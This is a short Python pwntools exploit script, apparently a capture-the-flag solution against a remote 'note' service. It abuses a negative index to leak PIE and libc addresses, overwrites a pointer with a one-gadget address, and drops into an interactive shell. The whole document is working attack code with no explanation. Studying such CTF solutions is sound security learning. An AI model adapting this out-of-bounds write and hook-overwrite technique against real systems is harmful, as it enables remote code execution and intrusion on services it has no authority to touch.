from pwn import *

#p = process("./note")
p = remote("124.156.135.103",6004)

go = lambda x : p.sendafter(":",str(x))

'''
struct Arr{
    char * ptr;
    __int64 size;
    __int64 size_shl;
}
'''

go(3)
go(-5)

p.recv(1)
pie = u64(p.recv(6)+"\x00\x00")

print 'pie : ' + hex(pie)

go(4)
go(-5)
go(p64(pie+0x78)+"\n")

go(4)
go(-5)
go(p64(pie-0x28)+p64(0x30)*2+"\n")

go(3)
go(0)
libc = u64(p.recvuntil("\x7f")[-6:]+"\x00\x00") - 0x26a80

print 'libc : ' + hex(libc)

go(4)
go(-5)
go(p64(libc+0x1e66c8)+p64(0x30)*2+"\n")

go(4)
go(0)
go(p64(libc+0xe2383)+"\n")

go(5)

p.interactive()
